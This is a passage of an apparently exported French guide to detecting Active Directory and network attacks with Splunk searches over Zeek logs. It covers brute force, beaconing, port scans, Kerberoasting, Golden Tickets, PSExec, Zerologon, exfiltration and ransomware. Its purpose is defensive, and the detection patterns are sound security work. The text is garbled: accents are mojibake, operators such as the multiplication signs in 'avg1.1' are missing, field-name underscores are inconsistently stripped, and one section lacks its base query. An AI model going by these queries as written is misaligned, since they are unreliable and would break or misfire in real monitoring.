Cliquez sur Enregistrer. L‚Äôapplication appara√Ætra alors dans la liste des applications.

Comprendre la structure du r√©pertoire

Apr√®s la cr√©ation de l‚Äôapplication, acc√©dez au dossier $SPLUNKHOME/etc/apps/ADAttackDetection. Vous y trouverez plusieurs sous-dossiers ayant chacun un r√¥le sp√©cifique :
/bin : Contient les scripts personnalis√©s.
/default : Contient les fichiers de configuration par d√©faut, les vues, les tableaux de bord et la navigation.
/local : Contient les configurations personnalis√©es (modifications locales).
/metadata : Contient les fichiers relatifs aux permissions et m√©tadonn√©es.

Modifier le fichier de navigation
Ouvrez le fichier $SPLUNKHOME/etc/apps/ADAttackDetection/default/data/ui/nav/default.xml avec un √©diteur de texte.
Ce fichier XML d√©finit la navigation de l‚Äôapplication. Chaque balise &lt;view&gt; repr√©sente une vue affich√©e dans la barre de navigation. Exemple :

&lt;nav searchview="search"&gt;
  &lt;view name="search" default='true' /&gt;
  &lt;view name="analyticsworkspace" /&gt;
  &lt;view name="datasets" /&gt;
  &lt;view name="reports" /&gt;
  &lt;view name="alerts" /&gt;
  &lt;view name="dashboards" /&gt;
&lt;/nav&gt;
search\view : Sp√©cifie la vue par d√©faut.
default='true' : D√©finit la page d‚Äôaccueil par d√©faut (ici, la recherche).

Cr√©er un tableau de bord (Dashboard)
Dans votre application Splunk, allez dans Tableaux de bord.
Cliquez sur Cr√©er un nouveau tableau de bord et renseignez :
Nom du tableau de bord : Par exemple Tableau de bord AD.
Description : (facultatif)
Permissions : D√©finissez-les selon vos besoins.
Type de tableau de bord : Choisissez Tableaux de bord classiques.
Configurez votre tableau de bord avec des panneaux (panels), des filtres, et une plage temporelle.
Pour faire r√©f√©rence √† un champ d‚Äôentr√©e, utilisez des tokens : $nomduchamp$.
Emplacement des tableaux de bord

Les fichiers XML de configuration des tableaux de bord se trouvent dans :
&lt;CheminDeLApp&gt;/local/data/ui/views/nomdudashboard.xml.
Ajouter un tableau de bord √† la navigation
Ouvrez √† nouveau le fichier default.xml :
   $SPLUNKHOME/etc/apps/ADAttack_Detection/default/data/ui/nav/default.xml.
Ajoutez le nom du tableau de bord dans la section &lt;nav&gt; pour qu‚Äôil apparaisse dans la barre de navigation.

Red√©marrer Splunk
Red√©marrez Splunk pour que les modifications soient prises en compte et que le tableau de bord apparaisse dans la navigation de l‚Äôapplication.

Regrouper plusieurs tableaux de bord

Pour organiser vos tableaux de bord dans un groupe, utilisez la balise &lt;collection&gt; dans le fichier default.xml :

&lt;collection label="Tableaux de bord AD"&gt;
  &lt;view name="dashboard1" /&gt;
  &lt;view name="dashboard2" /&gt;
&lt;/collection&gt;
Mettre √† jour une application existante

Pour mettre √† jour votre application √† partir d‚Äôun fichier pr√©configur√© :
T√©l√©chargez le fichier Detection-of-Active-Directory-Attacks.tar.gz depuis la section des ressources.
Acc√©dez √† Applications ‚Üí G√©rer les applications, puis cliquez sur Installer une application √† partir d‚Äôun fichier.
S√©lectionnez le fichier, cochez Mettre √† jour l‚Äôapplication pour √©craser l‚Äôexistante, puis cliquez sur T√©l√©verser.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting RDP Brute Force Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-802c-b89f-e733b5ec9e58"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection des attaques RDP par brute force

Les attaques par brute force RDP impliquent des tentatives r√©p√©t√©es de connexion √† une session RDP, en exploitant des mots de passe faibles ou par d√©faut pour acc√©der aux syst√®mes. Ce guide d√©crit comment d√©tecter ces attaques avec Splunk et les journaux Zeek.
Requ√™te de d√©tection

Cette requ√™te Splunk analyse les journaux Zeek et identifie les adresses IP avec un grand nombre de tentatives de connexion RDP en peu de temps, ce qui peut indiquer une attaque par brute force.
Explication de la requ√™te
Index et sourcetype :
Filtrage des donn√©es RDP brute force avec index="rdpbruteforce" et sourcetype="bro:rdp:json".
Binning du temps :
La commande bin regroupe les √©v√©nements en intervalles de 5 minutes, facilitant la d√©tection des pics de tentatives typiques des attaques par brute force.
Comptage et regroupement :
La commande stats compte les tentatives de connexion par adresse IP source (id.origh) et adresse IP de destination (id.resph) dans chaque p√©riode de 5 minutes.
Filtrage par seuil :
Le crit√®re where count &gt; 30 filtre les √©v√©nements o√π plus de 30 tentatives de connexion sont observ√©es dans une fen√™tre de 5 minutes, ce qui peut indiquer une activit√© de brute force.
Requ√™te Splunk

index="rdpbruteforce" sourcetype="bro:rdp:json"
| bin time span=5m
| stats count values(cookie) by time, id.origh, id.resph
| where count &gt; 30
Interpr√©tation des r√©sultats
√âv√©nements avec un grand nombre de tentatives : Si une IP source (id.origh) a plus de 30 tentatives de connexion vers une IP de destination (id.resph) dans un intervalle de 5 minutes, cela peut indiquer une tentative de brute force.
Cookies de session : Plusieurs valeurs uniques de cookie indiquent des tentatives de connexion s√©par√©es, soutenant la d√©tection de motifs de brute force.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">D<strong>etecting Beaconing Malware</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f4-952e-c155928bb714"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Vue d‚Äôensemble

Les malwares utilisant des techniques de beaconing, comme Cobalt Strike dans sa configuration par d√©faut, communiquent avec leur serveur de Command &amp; Control (C2) √† des intervalles r√©guliers. En surveillant les intervalles entre ces communications dans les journaux r√©seau (ici via Zeek), on peut identifier des comportements suspects.

Ce guide pr√©sente une requ√™te Splunk permettant de d√©tecter ces sch√©mas de communication r√©guli√®re dans le trafic HTTP.

Configuration de la requ√™te de d√©tection

Cette requ√™te Splunk analyse les intervalles temporels dans le trafic HTTP pour identifier les connexions r√©p√©titives et r√©guli√®res ‚Äî caract√©ristiques du beaconing.
Explication de la requ√™te
Filtrage des donn√©es pertinentes
index="cobaltstrikebeacon" et sourcetype="bro:http:json" ciblent les journaux HTTP de Zeek (au format JSON) associ√©s au malware Cobalt Strike.
Tri chronologique des √©v√©nements
sort 0 time trie les √©v√©nements par ordre croissant de temps pour permettre des calculs temporels fiables.
Calcul des diff√©rences de temps
streamstats calcule la diff√©rence de temps (timedelta) entre deux √©v√©nements cons√©cutifs, regroup√©s par IP source, IP destination et port de destination.
Calcul de l‚Äôintervalle moyen
eventstats calcule l‚Äôintervalle moyen (avg) entre les √©v√©nements ainsi que leur nombre total (total), pour chaque couple source-destination.
D√©finition d‚Äôune plage d‚Äôintervalles acceptables
eval upper=avg1.1 et eval lower=avg0.9 fixent une marge de ¬±10% autour de l‚Äôintervalle moyen pour tenir compte des petites variations.
Filtrage des intervalles r√©guliers
where timedelta &gt; lower AND timedelta &lt; upper conserve les √©v√©nements dont l‚Äôintervalle est proche de la moyenne.
Calcul du pourcentage de r√©gularit√©
stats agr√®ge les donn√©es et calcule le pourcentage (prcnt) d‚Äô√©v√©nements respectant la plage r√©guli√®re pour chaque connexion.
Filtrage sur le seuil de r√©gularit√©
where prcnt &gt; 90 AND total &gt; 10 garde uniquement les connexions avec plus de 90% de r√©gularit√© et au moins 10 √©v√©nements ‚Äî crit√®res minimaux pour √©viter les faux positifs.

Requ√™te Splunk

index="cobaltstrikebeacon" sourcetype="bro:http:json" 
| sort 0 time
| streamstats current=f last(time) as prevtime by src, dest, destport
| eval timedelta = time - prevtime
| eventstats avg(timedelta) as avg, count as total by src, dest, destport
| eval upper=avg1.1
| eval lower=avg0.9
| where timedelta &gt; lower AND timedelta &lt; upper
| stats count, values(avg) as TimeInterval by src, dest, destport, total
| eval prcnt = (count/total)100
| where prcnt &gt; 90 AND total &gt; 10
Description des champs
index="cobaltstrikebeacon" : Filtre les √©v√©nements provenant du bon index.
sourcetype="bro:http:json" : Sp√©cifie les journaux HTTP de Zeek au format JSON.
sort 0 time : Trie les √©v√©nements par ordre chronologique.
streamstats last(time) : Calcule le temps entre chaque √©v√©nement pour un m√™me flux (m√™me src/dest/port).
eventstats avg(timedelta) : Calcule l‚Äôintervalle moyen et le nombre total d‚Äô√©v√©nements pour chaque connexion.
eval upper / lower : D√©termine une marge autour de l‚Äôintervalle moyen.
where timedelta &gt; lower AND timedelta &lt; upper : Ne garde que les intervalles r√©guliers.
stats : Agr√®ge les r√©sultats et calcule le pourcentage de r√©gularit√©.
where prcnt &gt; 90 AND total &gt; 10 : Affiche uniquement les connexions pr√©sentant un comportement typique de beaconing.

Interpr√©tation des r√©sultats
Intervalle r√©gulier : Si plus de 90% des communications d'une connexion se font √† intervalles constants, cela indique possiblement un comportement de type beaconing*.
Seuil d‚Äô√©v√©nements : Un minimum de 10 √©v√©nements est requis pour √©viter les fausses alertes dues √† un faible volume de donn√©es.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Nmap Port Scanning</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f5-b074-eec6e495c632"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">H. D√©tection des scans de ports Nmap via Splunk

Le scan de ports est une technique classique de reconnaissance utilis√©e par les attaquants pour identifier les services ouverts sur une cible. L‚Äôun des outils les plus couramment utilis√©s pour cela est Nmap.

Ce type de comportement se manifeste par des tentatives de connexion √† plusieurs ports, souvent sans envoi de donn√©es (payload), dans un laps de temps tr√®s court. Gr√¢ce aux logs Zeek (anciennement Bro), on peut d√©tecter ces tentatives suspectes en observant des connexions avec origbytes=0 (aucune donn√©e transmise) et en comptant le nombre de ports diff√©rents touch√©s.

Requ√™te Splunk ‚Äì D√©tection d‚Äôun scan de ports

index="cobaltstrikebeacon" sourcetype="bro:conn:json" origbytes=0 destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) 
| bin span=5m time 
| stats dc(destport) as numdestport by time, srcip, destip 
| where numdestport &gt;= 3
Explication de la requ√™te
Source des donn√©es
index="cobaltstrikebeacon" : Index contenant les logs r√©seau captur√©s par Zeek.
sourcetype="bro:conn:json" : Logs JSON relatifs aux connexions r√©seau.
Filtrage des connexions sans payload
origbytes=0 : Ne conserve que les connexions o√π aucun octet n‚Äôa √©t√© transmis par l‚Äô√©metteur. Cela indique souvent une tentative de scan ou de reconnaissance passive, typique d‚Äôoutils comme Nmap.
Restriction aux plages IP internes
destip IN (192.168.0.0/16, 172.16.0.0/12, 10.0.0.0/8) : On ne surveille que les connexions visant des adresses IP priv√©es, afin de d√©tecter des comportements suspects au sein du r√©seau interne.
Agr√©gation temporelle
| bin span=5m time : Regroupe les √©v√©nements par tranche de 5 minutes, ce qui permet d‚Äôidentifier des activit√©s regroup√©es dans le temps ‚Äî comportement typique d‚Äôun scan.
Comptage des ports cibl√©s
| stats dc(destport) as numdestport by time, srcip, destip :
Compte le nombre de ports distincts touch√©s (dc(destport)) par une IP source (srcip) sur une IP de destination (destip) pendant une p√©riode de 5 minutes.
Seuil d‚Äôalerte
| where numdestport &gt;= 3 : Ne conserve que les cas o√π au moins trois ports diff√©rents ont √©t√© cibl√©s en 5 minutes. Cela correspond √† un comportement suspect, pouvant indiquer un scan en phase de reconnaissance.

Interpr√©tation des r√©sultats
IP source suspecte (srcip) : L‚Äôadresse identifi√©e comme ayant tent√© de scanner plusieurs ports sans transmettre de donn√©es.
Scan de reconnaissance : Les scans √† faible bruit (ex : 3 ports seulement) sont souvent utilis√©s pour √©viter la d√©tection. Un seuil plus √©lev√© (5 ou 10 ports) peut √™tre utilis√© pour d√©tecter des scans plus agressifs.
Contexte interne : Un scan de ports interne peut indiquer qu‚Äôun poste compromis tente de cartographier le r√©seau.

Recommandations
Augmenter le seuil si trop de faux positifs
  Un numdest_port &gt; 3 peut √™tre trop faible selon l‚Äôenvironnement ; augmenter √† 5 ou 10 selon le contexte r√©seau.
Corr√©lation avec d‚Äôautres √©v√©nements
  Associer cette d√©tection √† des tentatives d‚Äôexploitation, de connexion SSH, ou √† des alertes IDS/IPS pour enrichir l‚Äôanalyse.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberos Brute Force Attacks.</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ca-a45d-fb8345897875"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">G. D√©tection des attaques Brute Force Kerberos via Splunk

Une attaque brute force Kerberos consiste √† envoyer en masse des requ√™tes d‚Äôauthentification de type AS-REQ au KDC (Key Distribution Center), dans le but d‚Äôidentifier des noms d‚Äôutilisateur valides. M√™me si l‚Äôauthentification √©choue, les messages d‚Äôerreur renvoy√©s permettent √† un attaquant de deviner quels comptes existent r√©ellement.

Ces tentatives sont g√©n√©ralement marqu√©es par de nombreux √©checs d‚Äôauthentification, et certaines erreurs sp√©cifiques permettent de distinguer les noms d‚Äôutilisateurs valides des invalides.

Requ√™te Splunk ‚Äì D√©tection de brute force Kerberos

index="kerberosbruteforce" sourcetype="bro:kerberos:json"
errormsg!=KDCERRPREAUTHREQUIRED
success="false" requesttype=AS
| bin time span=5m
| stats count dc(client) as "Utilisateurs uniques" values(errormsg) as "Messages d'erreur" by time, id.origh, id.resph
| where count&gt;30
Explication de la requ√™te
Source des donn√©es
index="kerberosbruteforce" : Index contenant les logs Kerberos captur√©s par Zeek.
sourcetype="bro:kerberos:json" : Source au format JSON sp√©cifique aux √©v√©nements Kerberos.
Filtrage des erreurs pertinentes
errormsg!=KDCERRPREAUTHREQUIRED : Exclut les erreurs classiques de pr√©-authentification (ce type d'erreur indique souvent que l‚Äôutilisateur existe, ce qui est justement ce que cherchent les attaquants).
Cela permet de se concentrer sur les tentatives qui √©chouent sans atteindre le stade de la pr√©-authentification, typiques lors de tests sur des comptes inexistants.
S√©lection des √©checs d‚Äôauthentification AS-REQ
success="false" : Ne garde que les tentatives d‚Äôauthentification √©chou√©es.
requesttype=AS : Se focalise sur les requ√™tes de type AS-REQ, envoy√©es pour obtenir un TGT.
Regroupement temporel des √©v√©nements
| bin time span=5m : Regroupe les √©v√©nements par tranche de 5 minutes, ce qui permet de d√©tecter les rafales de requ√™tes typiques des attaques brute force.
Statistiques par client et serveur
| stats count dc(client) as "Utilisateurs uniques" values(errormsg) as "Messages d'erreur" by time, id.origh, id.resph :
count : Nombre total de tentatives √©chou√©es par tranche de temps et par adresse IP.
dc(client) : Nombre de noms d‚Äôutilisateur distincts cibl√©s.
values(errormsg) : Liste des messages d‚Äôerreur retourn√©s, utiles pour rep√©rer une phase de reconnaissance ou de test d'existence de comptes.
Seuil d‚Äôalerte pour d√©tection
| where count&gt;30 : Ne conserve que les cas o√π plus de 30 tentatives √©chou√©es sont observ√©es en 5 minutes, ce qui est consid√©r√© comme suspect.

Interpr√©tation des r√©sultats
Volume √©lev√© de tentatives √©chou√©es : Une origine unique (m√™me IP) avec plus de 30 tentatives √©chou√©es dans un intervalle court indique fortement une attaque brute force.
Diversit√© des comptes cibl√©s : Un grand nombre d‚Äôutilisateurs diff√©rents sugg√®re une tentative de d√©couverte de comptes valides.
Analyse des messages d‚Äôerreur : Certains codes d‚Äôerreur peuvent confirmer que des utilisateurs existent, ce qui signifie que l‚Äôattaquant tente d'√©num√©rer les comptes avant de passer √† l‚Äôattaque.

√Ä investiguer
Adresse IP source (id.origh) : Est-ce une machine interne ? Est-elle cens√©e g√©n√©rer des requ√™tes Kerberos ?
Cible (id.resp_h) : G√©n√©ralement un KDC, mais peut varier. Est-ce coh√©rent avec le trafic habituel ?
R√©action en cas d‚Äôalerte : Surveiller le poste, bloquer temporairement l‚ÄôIP, renforcer la journalisation et activer des protections comme la limitation des tentatives.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Kerberoasting</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-806f-a805-d6c1012adc53"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">F. D√©tection de Kerberoasting via Splunk

Le Kerberoasting est une technique d‚Äôattaque o√π un attaquant poss√©dant des identifiants valides dans le domaine demande des tickets TGS (Ticket Granting Service) pour des comptes de service (SPN). Ces tickets, souvent chiffr√©s avec l‚Äôalgorithme RC4, peuvent ensuite √™tre craqu√©s hors ligne afin d‚Äôextraire les mots de passe en clair des comptes cibl√©s.

L‚Äôindicateur principal est la demande anormale de tickets TGS utilisant RC4, car cette m√©thode de chiffrement est privil√©gi√©e pour le craquage.

Requ√™te Splunk ‚Äì D√©tection de Kerberoasting

index="sharphound" sourcetype="bro:kerberos:json"
requesttype=TGS cipher="rc4-hmac" 
forwardable="true" renewable="true"
| table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service
Explication de la requ√™te
Source des donn√©es
index="sharphound" : Index contenant les √©v√©nements de Kerberos, collect√©s par un outil comme SharpHound ou un syst√®me de monitoring r√©seau.
sourcetype="bro:kerberos:json" : Utilise les logs Zeek (anciennement Bro) pour les √©v√©nements Kerberos au format JSON.
Filtrage des requ√™tes TGS chiffr√©es en RC4
requesttype=TGS : Ne retient que les requ√™tes de tickets de service.
cipher="rc4-hmac" : S√©lectionne les tickets utilisant le chiffrement RC4, plus vuln√©rable, et donc privil√©gi√© par les attaquants.
Crit√®res comportementaux suspects
forwardable="true" : Le ticket peut √™tre r√©utilis√© sur d‚Äôautres services.
renewable="true" : Le ticket peut √™tre prolong√©, ce qui est utile pour un attaquant cherchant une persistance.
Affichage clair des r√©sultats
table time, id.origh, id.resph, requesttype, cipher, forwardable, renewable, client, service : Affiche les informations essentielles pour l‚Äôanalyse :
Date et heure de l‚Äô√©v√©nement.
IP source (client) et IP destination (souvent un contr√¥leur de domaine).
Type de requ√™te, chiffrement utilis√©.
Compte client et service cible.

Interpr√©tation
Plusieurs requ√™tes TGS en RC4 : Une fr√©quence √©lev√©e de requ√™tes TGS avec RC4 par un m√™me utilisateur ou h√¥te est hautement suspecte.
Comptes √† privil√®ges ou services sensibles : Si le champ service cible un compte critique (SQL, Exchange, etc.), cela peut indiquer une tentative de Kerberoasting.
Activit√© centralis√©e sur un poste utilisateur : Des requ√™tes massives de TGS depuis un poste utilisateur (plut√¥t qu‚Äôun service ou serveur) sont anormales.

√Ä investiguer
Client (id.orig_h) : S‚Äôagit-il d‚Äôune machine l√©gitime ?
Compte (client) : Est-ce un compte utilisateur normal ou un compte de service d√©tourn√© ?
Service cibl√© (service) : Est-ce un compte ayant des privil√®ges √©lev√©s ou un r√¥le critique ?</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Golden Tickets</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8075-971f-c1c7c1f4afc8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Strengths
Precision Targeting: Focusing on requesttype=="TGS" and uniquerequesttypes==1 accurately narrows in on possible forged activity.
Use of Zeek's bro:kerberos:json: Shows you're leveraging network-layer Kerberos visibility, which is less prone to tampering than Windows logs alone.
Binning by Time: Grouping by 1-minute intervals helps detect burst or pattern-based activity, which is key in attacker behavior.

Suggested Enhancements
Improve requesttypes=="TGS" Handling

values(requesttype) can return a multivalue field (array-like), so direct equality may be unreliable. Use mvcount() and mvindex() to improve robustness:

| where uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
This ensures requesttypes truly only contains "TGS".

Add Host Context

If Zeek logs contain host or principal fields, include them for deeper triage:

| stats values(client), values(principal), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
Add Baseline for Alert Tuning

To avoid false positives, consider correlating results with a list of known service accounts (e.g., via lookup serviceaccounts.csv) to suppress legitimate batch activity.

Optional: Include Count for Volume

Adding request count per interval can reveal abnormal ticket request volume:

| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
Then filter with something like:

| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
Final Enhanced Query Example

index="goldenticketattack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin time span=1m
| stats count as totalrequests, values(client), values(requesttype) as requesttypes, dc(requesttype) as uniquerequesttypes by time, id.origh, id.resph
| where totalrequests &gt; 10 AND uniquerequesttypes==1 AND mvcount(requesttypes)==1 AND mvindex(requesttypes,0)=="TGS"
This version is more robust and better tuned for production alerts.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Cobalt Strike's PSExec</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8034-a4fb-c16bb493ddce"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requ√™te Splunk pour la d√©tection de l‚Äôoutil PSExec de Cobalt Strike

La requ√™te suivante permet de rep√©rer les comportements caract√©ristiques de l‚Äôutilisation de l‚Äôoutil psexec de Cobalt Strike. Celui-ci s‚Äôappuie sur le protocole SMB pour d√©poser et ex√©cuter des fichiers (typiquement des ex√©cutables) sur une machine cible, en acc√©dant √† des partages administratifs comme C$ ou ADMIN$.
Requ√™te Splunk

index="cobaltstrikepsexec"
sourcetype="bro:smbfiles:json"
action="SMB::FILEOPEN" 
name IN (".exe", ".dll", ".bat")
path IN ("\\c$", "\\ADMIN$")
size &gt; 0
D√©tail de la requ√™te
S√©lection de la source de donn√©es
index="cobaltstrikepsexec" : Cible l‚Äôindex contenant les √©v√©nements li√©s aux activit√©s de psexec.
sourcetype="bro:smbfiles:json" : Filtre les √©v√©nements SMB enregistr√©s par Zeek/Bro, au format JSON, relatifs aux op√©rations sur fichiers via SMB.
Filtrage des actions d‚Äôouverture de fichier
action="SMB::FILEOPEN" : Ne conserve que les √©v√©nements o√π un fichier a √©t√© ouvert via SMB ‚Äî une action typique lors du d√©ploiement d‚Äôun binaire avec psexec.
Types de fichiers suspects
name IN (".exe", ".dll", ".bat") : Cible les fichiers ex√©cutables, DLL et scripts batch ‚Äî types couramment utilis√©s pour d√©poser des charges malveillantes.
Acc√®s aux partages administratifs
path IN ("\\c$", "\\ADMIN$") : Se concentre sur les chemins administratifs Windows, comme C$ et ADMIN$, que psexec utilise souvent pour transf√©rer des fichiers.
Fichiers non vides
size &gt; 0 : Exclut les fichiers vides pour ne garder que ceux susceptibles de contenir une v√©ritable charge utile.

Strat√©gie de d√©tection et interpr√©tation

Cette requ√™te permet d‚Äôidentifier une s√©quence d‚Äôactions typique de l‚Äôutilisation de psexec par Cobalt Strike :
D√©ploiement de payload √† distance : L‚Äôouverture d‚Äôun fichier .exe, .dll ou .bat sur un partage comme C$ ou ADMIN$, via SMB, sugg√®re un d√©ploiement automatis√© √† l‚Äôaide d‚Äôun outil d‚Äôadministration distante.
Filtrage efficace du trafic l√©gitime : En ciblant les fichiers ex√©cutables non vides sur des partages administratifs, on limite les faux positifs dus aux op√©rations l√©gitimes ou aux fichiers inoffensifs.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Zerologon</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8098-aa6c-fd4a9b84fbb4"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Splunk Query for Detecting Zerologon Attack

index="zerologon" endpoint="netlogon" sourcetype="bro:dcerpc:json"
| bin time span=1m
| where operation == "NetrServerReqChallenge" OR operation == "NetrServerAuthenticate3" OR operation == "NetrServerPasswordSet2"
| stats count values(operation) as operationvalues dc(operation) as uniqueoperations by time, id.origh, id.resph
| where uniqueoperations &gt;= 2 AND count&gt;100
Query Breakdown:
Data Source:
index="zerologon": Filters for Zerologon-related events.
endpoint="netlogon": Focuses on Netlogon traffic, exploited in Zerologon.
sourcetype="bro:dcerpc:json": Captures DCE-RPC logs from Zeek.
Time Binning:
| bin time span=1m: Groups events in one-minute intervals to detect rapid patterns.
Key Operations Filtering:
Filters for Zerologon-related operations: NetrServerReqChallenge, NetrServerAuthenticate3, and NetrServerPasswordSet2.
Statistical Analysis:
| stats count values(operation) as operationvalues dc(operation) as uniqueoperations by time, id.origh, id.resph: Aggregates by time and IPs, counting occurrences and distinct operations.
Anomalous Pattern Detection:
| where uniqueoperations &gt;= 2 AND count&gt;100: Flags cases with multiple operations and high counts, indicating suspicious activity typical of a Zerologon attack.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Exfiltration (HTTP)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-803a-b111-ffe91d4667c9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requ√™te Splunk pour d√©tecter une exfiltration de donn√©es via HTTP

index="cobaltstrikeexfiltrationhttp" sourcetype="bro:http:json" method=POST
| stats sum(requestbodylen) as TotalBytes by src, dest, destport
| eval TotalBytes = TotalBytes/1024/1024
Explication de la requ√™te
S√©lection de la source de donn√©es :
index="cobaltstrikeexfiltrationhttp" : cible les logs pr√©sents dans l‚Äôindex d√©di√© √† la d√©tection d‚Äôexfiltration HTTP potentielle li√©e √† Cobalt Strike.
sourcetype="bro:http:json" : s√©lectionne uniquement les logs HTTP g√©n√©r√©s par Zeek (anciennement Bro) au format JSON.
method=POST : filtre pour ne garder que les requ√™tes HTTP de type POST, car ce type de m√©thode est fr√©quemment utilis√© pour exfiltrer des donn√©es dans le corps des requ√™tes.
Agr√©gation du volume de donn√©es transf√©r√©es :
| stats sum(requestbodylen) as TotalBytes by src, dest, destport : calcule la somme de la taille des corps des requ√™tes POST (requestbodylen) envoy√©s par chaque IP source (src) vers chaque IP de destination (dest) et port de destination (dest_port).
Cela permet de rep√©rer des transferts anormalement volumineux de donn√©es vers certaines destinations, ce qui peut r√©v√©ler une exfiltration.
Conversion de l‚Äôunit√© de mesure :
| eval TotalBytes = TotalBytes/1024/1024 : convertit la taille totale des donn√©es transf√©r√©es depuis les octets vers les m√©gaoctets (Mo) pour une lecture plus intuitive.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Exfiltration (DNS)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80f2-89fb-c8674cff4328"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Requ√™te Splunk pour d√©tecter une exfiltration de donn√©es via DNS

index=dnsexf sourcetype="bro:dns:json"
| eval lenquery=len(query)
| search lenquery&gt;=40 AND query!=".ip6.arpa" AND query!="amazonaws.com" AND query!=".googlecast." AND query!="ldap."
| bin time span=24h
| stats count(query) as reqbyday by time, id.origh, id.resph
| where reqbyday&gt;60
| table time, id.origh, id.resph, reqbyday
Explication de la requ√™te
S√©lection des donn√©es pertinentes :
index=dnsexf sourcetype="bro:dns:json" : filtre les logs pour ne garder que ceux relatifs au DNS (au format JSON de Bro/Zeek DNS) dans l‚Äôindex dnsexf, utilis√© ici pour surveiller une √©ventuelle exfiltration de donn√©es par DNS.
Calcul de la longueur des requ√™tes DNS :
| eval lenquery=len(query) : calcule la longueur de chaque requ√™te DNS et stocke cette valeur dans un nouveau champ lenquery. Les requ√™tes longues peuvent contenir des donn√©es encod√©es ou chiffr√©es.
Filtrage sur la longueur des requ√™tes et exclusion de domaines l√©gitimes fr√©quents :
| search lenquery&gt;=40 AND query!=".ip6.arpa" AND query!="amazonaws.com" AND query!=".googlecast." AND query!="ldap." :
conserve uniquement les requ√™tes DNS dont la longueur est sup√©rieure ou √©gale √† 40 caract√®res,
exclut les domaines connus et b√©nins, comme les requ√™tes de r√©solution IPv6 (ip6.arpa), les services cloud (amazonaws.com), les appareils Chromecast (googlecast) et les requ√™tes LDAP.
Regroupement des √©v√©nements par tranche de 24 heures :
| bin time span=24h : regroupe les √©v√©nements par jour pour faciliter l‚Äôanalyse temporelle.
Comptage des requ√™tes par jour et par h√¥te :
| stats count(query) as reqbyday by time, id.origh, id.resph : compte le nombre total de requ√™tes DNS par jour (reqbyday), en les regroupant par adresse IP source (id.origh) et destination (id.resph).
Identification d‚Äôactivit√©s suspectes :
| where reqbyday&gt;60 : ne garde que les h√¥tes ayant g√©n√©r√© plus de 60 requ√™tes DNS par jour ‚Äî un comportement potentiellement indicatif d‚Äôexfiltration.
Affichage des r√©sultats :
| table time, id.origh, id.resph, reqby_day : affiche les r√©sultats dans un tableau avec la date, l‚ÄôIP source, l‚ÄôIP de destination et le nombre de requ√™tes par jour, pour une analyse simplifi√©e.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Ransomware</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8028-bb6f-fd4b026ac2ff"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection des ransomwares avec Splunk
1. D√©tection des op√©rations excessives d'ouverture et de renommage de fichiers

Ce type de comportement est souvent observ√© lors d'attaques par ransomware, o√π de nombreux fichiers sont ouverts et renomm√©s dans de courtes p√©riodes.
Requ√™te Splunk

index="ransomwareopenrenamesodinokibi" sourcetype="bro:smbfiles:json" 
| where action IN ("SMB::FILEOPEN", "SMB::FILERENAME")
| bin time span=5m
| stats count by time, source, action
| where count&gt;30 
| stats sum(count) as count values(action) dc(action) as uniqactions by time, source
| where uniqactions==2 AND count&gt;100
Explication de la requ√™te
Filtrage des √©v√©nements : La recherche se limite aux actions FILEOPEN et FILERENAME dans l'index sp√©cifi√©.
Groupement par intervalles de 5 minutes : Les √©v√©nements sont regroup√©s par p√©riodes de 5 minutes pour d√©tecter des pics d'activit√©.
Comptage des √©v√©nements : Les actions sont compt√©es par source dans chaque p√©riode de 5 minutes, avec un seuil de 30 actions.
